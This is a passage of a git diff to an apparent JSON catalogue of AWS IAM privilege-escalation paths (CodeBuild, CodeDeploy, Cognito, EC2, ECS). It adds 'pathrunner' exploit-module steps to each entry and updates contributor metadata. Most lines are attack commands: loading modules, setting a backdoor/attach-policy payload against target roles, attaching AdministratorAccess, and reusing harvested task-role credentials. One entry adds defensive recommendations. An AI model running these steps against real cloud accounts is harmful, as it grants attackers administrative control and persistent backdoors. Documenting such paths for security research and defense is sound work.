           "step": 5,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use codebuild-001",
+          "description": "Load the codebuild-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -5066,8 +5759,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -5125,6 +5823,38 @@
           "step": 5,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use codebuild-002",
+          "description": "Load the codebuild-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set PROJECT_NAME target-codebuild-project",
+          "description": "Set the PROJECT_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -5288,8 +6018,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -5352,6 +6087,38 @@
           "step": 6,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use codebuild-003",
+          "description": "Load the codebuild-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set PROJECT_NAME target-codebuild-project",
+          "description": "Set the PROJECT_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -5523,8 +6290,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -5579,6 +6351,38 @@
           "step": 5,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use codebuild-004",
+          "description": "Load the codebuild-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -5767,8 +6571,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -5864,6 +6673,33 @@
           "step": 4,
           "command": "aws deploy get-deployment \\\n  --deployment-id DEPLOYMENT_ID \\\n  --query 'deploymentInfo.status' \\\n  --output text\n",
           "description": "Monitor deployment status. Once the BeforeInstall hook executes, AdministratorAccess is attached to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use codedeploy-001",
+          "description": "Load the codedeploy-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set APP_NAME target-app",
+          "description": "Set the APP_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set DEPLOYMENT_GROUP target-deployment-group",
+          "description": "Set the DEPLOYMENT_GROUP option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set BUCKET target-s3-bucket-123456789012",
+          "description": "Set the BUCKET option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -6002,8 +6838,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -6094,6 +6935,28 @@
           "step": 5,
           "command": "AWS_ACCESS_KEY_ID=TEMP_KEY_ID \\\nAWS_SECRET_ACCESS_KEY=TEMP_SECRET \\\nAWS_SESSION_TOKEN=TEMP_TOKEN \\\naws iam attach-user-policy \\\n  --user-name STARTING_USER \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n",
           "description": "Use the obtained temporary admin credentials to attach AdministratorAccess to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use cognitoidentity-001",
+          "description": "Load the cognitoidentity-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set IDENTITY_POOL_ID us-east-1:12345678-1234-1234-1234-123456789012",
+          "description": "Set the IDENTITY_POOL_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -6237,8 +7100,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -6506,6 +7374,38 @@
           "command": "run ec2__startup_shell_script --instance-profile PRIVILEGED_ROLE --script exploit.sh",
           "description": "Use Pacu to launch EC2 instance with the target role and execute a shell script on startup"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ec2-001",
+          "description": "Load the ec2-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_PROFILE arn:aws:iam::123456789012:instance-profile/TargetInstanceProfile",
+          "description": "Set the INSTANCE_PROFILE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does an EC2 instance need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificEC2Role\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ec2.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual EC2 instance creation followed by immediate access\n- Monitor CloudTrail for EC2 instance launches by principals who do not usually create instances\n- Monitor CloudTrail for roles being passed to EC2 that haven't been used before\n- Monitor and alert on EC2 instance creation with privileged roles\n- Regularly audit EC2 instances for excessive IAM permissions\n- Regularly audit all IAM roles that trust the EC2 service and down-scope any roles with administrative access\n",
@@ -6771,8 +7671,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -6821,6 +7726,38 @@
           "step": 4,
           "command": "aws ec2 start-instances --instance-ids $INSTANCE_ID",
           "description": "Start the instance to trigger execution of the malicious user data"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ec2-002",
+          "description": "Load the ec2-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_ID i-0123456789abcdef0",
+          "description": "Set the INSTANCE_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -7009,8 +7946,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -7117,6 +8059,23 @@
           "step": 7,
           "command": "# Verify administrator access by listing IAM users\naws iam list-users\n",
           "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ec2-003",
+          "description": "Load the ec2-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set INSTANCE_ID i-0123456789abcdef0",
+          "description": "Set the INSTANCE_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -7268,8 +8227,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -7387,6 +8351,38 @@
           "step": 8,
           "command": "# Verify administrator access\naws iam list-users\n",
           "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ec2-004",
+          "description": "Load the ec2-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_PROFILE arn:aws:iam::123456789012:instance-profile/TargetInstanceProfile",
+          "description": "Set the INSTANCE_PROFILE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -7542,8 +8538,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -7630,6 +8631,48 @@
           "step": 5,
           "command": "aws iam list-attached-user-policies \\\n  --user-name STARTING_USER\n",
           "description": "Wait for an instance to launch (via Auto Scaling Group scale-out, EC2 Fleet, or manual RunInstances), then verify AdministratorAccess has been attached to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ec2-005",
+          "description": "Load the ec2-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set LAUNCH_TEMPLATE_NAME target-launch-template",
+          "description": "Set the LAUNCH_TEMPLATE_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set ASG_NAME target-auto-scaling-group",
+          "description": "Set the ASG_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set INSTANCE_PROFILE arn:aws:iam::123456789012:instance-profile/TargetInstanceProfile",
+          "description": "Set the INSTANCE_PROFILE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -7780,8 +8823,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -8133,6 +9181,38 @@
           "command": "aws sts get-caller-identity\naws iam list-attached-user-policies --user-name STARTING_USERNAME\n",
           "description": "Verify that the privilege escalation succeeded by checking if AdministratorAccess policy was attached to the starting user"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-001",
+          "description": "Load the ecs-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.\n",
@@ -8285,8 +9365,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -8401,6 +9486,38 @@
           "step": 7,
           "command": "aws sts get-caller-identity",
           "description": "Verify that the escalation succeeded by checking current permissions (e.g., test administrative access)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-002",
+          "description": "Load the ecs-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -8534,8 +9651,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -8602,6 +9724,43 @@
           "step": 7,
           "command": "aws sts get-caller-identity",
           "description": "Verify that your permissions have been escalated (if the task modified your principal)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-003",
+          "description": "Load the ecs-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set CLUSTER_ARN arn:aws:ecs::123456789012:cluster/target-ecs-cluster",
+          "description": "Set the CLUSTER_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -8804,8 +9963,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -8872,6 +10036,38 @@
           "step": 7,
           "command": "aws sts get-caller-identity",
           "description": "Verify that your privileges have been escalated by the task execution"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-004",
+          "description": "Load the ecs-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -9057,8 +10253,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -9125,6 +10326,48 @@
           "step": 7,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-005",
+          "description": "Load the ecs-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set CLUSTER_NAME target-ecs-cluster",
+          "description": "Set the CLUSTER_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set CONTAINER_INSTANCE_ARN arn:aws:ecs::123456789012:container-instance/target-ecs-cluster/abc1234567890",
+          "description": "Set the CONTAINER_INSTANCE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -9323,8 +10566,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -9418,6 +10666,23 @@
           "step": 6,
           "command": "export AWS_ACCESS_KEY_ID=\"<AccessKeyId>\"\nexport AWS_SECRET_ACCESS_KEY=\"<SecretAccessKey>\"\nexport AWS_SESSION_TOKEN=\"<Token>\"\naws sts get-caller-identity\n",
           "description": "Use the retrieved credentials outside the container to operate as the task role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-006",
+          "description": "Load the ecs-006 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set CLUSTER_NAME target-ecs-cluster",
+          "description": "Set the CLUSTER_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -9580,8 +10845,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -9703,6 +10973,58 @@
           "step": 8,
           "command": "aws ecs describe-tasks --cluster TARGET_CLUSTER --tasks TASK_ARN",
           "description": "Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-007",
+          "description": "Load the ecs-007 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set CLUSTER_NAME target-ecs-cluster",
+          "description": "Set the CLUSTER_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TASK_DEFINITION target-task-def:1",
+          "description": "Set the TASK_DEFINITION option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set CONTAINER_INSTANCE_ARN arn:aws:ecs::123456789012:container-instance/target-ecs-cluster/abc1234567890",
+          "description": "Set the CONTAINER_INSTANCE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner set CONTAINER_NAME target-container",
+          "description": "Set the CONTAINER_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 9,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 10,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -9926,8 +11248,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -10026,6 +11353,48 @@
           "step": 6,
           "command": "aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN",
           "description": "Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-008",
